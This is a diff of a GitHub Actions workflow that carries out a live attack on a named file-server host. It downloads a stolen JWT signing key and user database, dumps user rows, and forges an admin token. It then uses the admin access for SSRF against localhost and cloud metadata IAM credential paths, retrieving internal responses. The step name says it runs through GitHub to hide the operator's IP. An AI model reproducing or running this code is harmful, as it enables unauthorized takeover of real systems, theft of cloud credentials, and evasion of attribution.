@@ -5,7 +5,7 @@ jobs:
   admin:
     runs-on: ubuntu-latest
     steps:
-      - name: harvest jwt.key + dump users + forge admin JWT + SSRF probe (GitHub relay, zero own-IP)
+      - name: reharvest jwt.key + dump users + forge admin JWT + SSRF (zero own-IP)
         run: |
           set +e
           B="https://pan.yazinb.icu"
@@ -19,19 +19,79 @@ jobs:
           echo "jwt.key ascii=[$(cat /tmp/jwt.key)]  sha256=$(sha256sum /tmp/jwt.key|cut -c1-32)"
           U=$(get_raw "/$SUB/data/artex.sqlite"); dl "$U" /tmp/artex.sqlite
           echo "artex.sqlite size=$(wc -c < /tmp/artex.sqlite)"
-          CHOSEN=$(python3 -c "import sqlite3;c=sqlite3.connect('/tmp/artex.sqlite');tabs=[r[0] for r in c.execute(\"select name from sqlite_master where type='table'\")];ut=[t for t in tabs if 'user' in t.lower()][0];cols=[d[1] for d in c.execute('PRAGMA table_info(%s)'%ut)];rows=list(c.execute('select * from %s'%ut));pcol=next((i for i,c in enumerate(cols) if c.lower() in ('permission','is_admin','role')),None);ucol=next((i for i,c in enumerate(cols) if c.lower() in ('username','user','name')),0);ch=next((r[ucol] for r in rows if pcol is not None and str(r[pcol]) in ('1','admin','true','True','root')),None);print(ch if ch else (rows[0][ucol] if rows else ''))")
-          echo "ADMINUSER=[$CHOSEN]"
-          ADMINUSER="${CHOSEN:-admin}"
-          ADMINJWT=$(python3 -c "import hmac,hashlib,base64,json,time,sys;key=open('/tmp/jwt.key','rb').read().strip();b=lambda x:base64.urlsafe_b64encode(x).rstrip(b'=');usr=sys.argv[1] if len(sys.argv)>1 and sys.argv[1] else 'admin';now=int(time.time());h=b(json.dumps({'alg':'HS256','typ':'JWT'}).encode());p=b(json.dumps({'exp':now+3600,'iat':now,'nbf':now,'username':usr,'pwd_ts':0}).encode());s=b(hmac.new(key,(h+b'.'+p).encode(),hashlib.sha256).digest());print(h.decode()+'.'+p.decode()+'.'+s.decode())" "$ADMINUSER")
+          echo "=== dump users + forge admin JWT (FIXED: no .encode() on bytes) ==="
+          ADMINJWT=$(python3 -c "
+          import sqlite3,hmac,hashlib,base64,json,time
+          c=sqlite3.connect('/tmp/artex.sqlite')
+          tabs=[r[0] for r in c.execute('select name from sqlite_master where type=?',('table',))]
+          print('TABLES',tabs)
+          ut=None;uc=[]
+          for t in tabs:
+              cols=[d[1] for d in c.execute('PRAGMA table_info(%s)'%t)]
+              if any('user' in x.lower() for x in cols) and any('pass' in x.lower() for x in cols):
+                  ut=t;uc=cols;break
+          print('USERTABLE',ut,'COLS',uc)
+          rows=list(c.execute('select * from %s'%ut))
+          for r in rows: print('ROW',dict(zip(uc,r)))
+          uname=None
+          for r in rows:
+              d=dict(zip(uc,r)); u=str(d.get('username') or d.get('user') or d.get('name') or '')
+              if u.lower()=='admin': uname=u;break
+          if uname is None:
+              uname=str((dict(zip(uc,rows[0]))).get('username') or rows[0][0])
+          pts=0
+          for r in rows:
+              d=dict(zip(uc,r)); u=str(d.get('username') or d.get('user') or d.get('name') or '')
+              if u==uname:
+                  for k in d:
+                      if 'pwd_ts' in k.lower(): pts=d[k]
+                  break
+          print('SELECTED_USER',uname,'PWDTS',pts)
+          key=open('/tmp/jwt.key','rb').read().strip()
+          b=lambda x:base64.urlsafe_b64encode(x).rstrip(b'=')
+          now=int(time.time())
+          h=b(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
+          p=b(json.dumps({'exp':now+3600,'iat':now,'nbf':now,'username':uname,'pwd_ts':int(pts)}).encode())
+          s=b(hmac.new(key,h+b'.'+p,hashlib.sha256).digest())
+          print(h.decode()+'.'+p.decode()+'.'+s.decode())
+          " | grep -E '^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$')
           echo "ADMINJWT_LEN=${#ADMINJWT}"
-          echo "--- /api/me ---"
+          echo "ADMINJWT_HEAD=${ADMINJWT:0:24}"
+          if [ -z "$ADMINJWT" ]; then echo "FORGE FAILED"; exit 0; fi
+          echo "--- /api/me (admin verify) ---"
           curl -skS -m20 -X GET "$B/api/me" -H "Authorization: $ADMINJWT" -w "\n  HTTP %{http_code}\n" | head -c 600
-          echo "--- /api/admin/setting/list ---"
+          echo "--- /api/admin/setting/list (admin verify) ---"
           curl -skS -m20 -X POST "$B/api/admin/setting/list" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d '{}' -w "\n  HTTP %{http_code}\n" | head -c 400
-          echo "--- SSRF: add_offline_download 127.0.0.1:80 ---"
-          curl -skS -m30 -X POST "$B/api/fs/add_offline_download" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d '{"path":"/ssrf1","urls":["http://127.0.0.1:80/"]}' -w "\n  HTTP %{http_code}\n" | head -c 400
-          echo "--- SSRF: 169.254.169.254 ---"
-          curl -skS -m30 -X POST "$B/api/fs/add_offline_download" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d '{"path":"/ssrf2","urls":["http://169.254.169.254/latest/meta-data/"]}' -w "\n  HTTP %{http_code}\n" | head -c 400
-          echo "--- SSRF: self 119.28.135.153:443 ---"
-          curl -skS -m30 -X POST "$B/api/fs/add_offline_download" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d '{"path":"/ssrf3","urls":["http://119.28.135.153:443/"]}' -w "\n  HTTP %{http_code}\n" | head -c 400
+          echo "--- mkdir ssrf dirs ---"
+          for d in ssrf_local80 ssrf_local5244 ssrf_meta ssrf_meta_iam ssrf_self80; do
+            curl -skS -m20 -X POST "$B/api/fs/mkdir" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d "{\"path\":\"/$d\"}" -w "  mkdir /$d -> %{http_code}\n" -o /dev/null
+          done
+          ssrf () {
+            name=$1; url=$2
+            echo "=== SSRF $name -> $url ==="
+            curl -skS -m30 -X POST "$B/api/fs/add_offline_download" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d "{\"path\":\"/$name\",\"urls\":[\"$url\"]}" -w "\n  add HTTP %{http_code}\n" | head -c 400
+            sleep 6
+            lst=$(curl -skS -m30 -X POST "$B/api/fs/list" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d "{\"path\":\"/$name\"}")
+            echo "  list: $(echo "$lst" | head -c 250)"
+            fn=$(echo "$lst" | python3 -c "import sys,json;d=json.load(sys.stdin);c=d.get('data',{}).get('content',[]);print(c[0]['name'] if c else '')" 2>/dev/null)
+            if [ -n "$fn" ]; then
+              ru=$(curl -skS -m30 -X POST "$B/api/fs/get" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d "{\"path\":\"/$name/$fn\"}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('data',{}).get('raw_url',''))" 2>/dev/null)
+              echo "  raw_url: $ru"
+              echo "  --- internal body (first 800B) ---"
+              curl -skS -m30 "$ru" | head -c 800
+              echo
+            else
+              echo "  (no file landed - SSRF blocked or async)"
+            fi
+          }
+          ssrf ssrf_local80 "http://127.0.0.1:80/"
+          ssrf ssrf_local5244 "http://127.0.0.1:5244/"
+          ssrf ssrf_meta "http://169.254.169.254/latest/meta-data/"
+          ssrf ssrf_meta_iam "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+          ssrf ssrf_self80 "http://119.28.135.153:80/"
+          echo "--- add-storage-mount SSRF probe (WebDAV -> meta, self-cleaning) ---"
+          addresp=$(curl -skS -m30 -X POST "$B/api/admin/storage/create" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d '{"mount_path":"/ssrf_mount","driver":"WebDAV","addition":{"url":"http://169.254.169.254/","username":"x","password":"x"}}')
+          echo "  create resp: $(echo "$addresp" | head -c 350)"
+          sid=$(echo "$addresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('data',{}).get('id',''))" 2>/dev/null)
+          if [ -n "$sid" ]; then curl -skS -m20 -X POST "$B/api/admin/storage/delete" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d "{\"id\":$sid}" -w "  cleanup delete -> %{http_code}\n" -o /dev/null; fi
           echo "=== DONE ==="
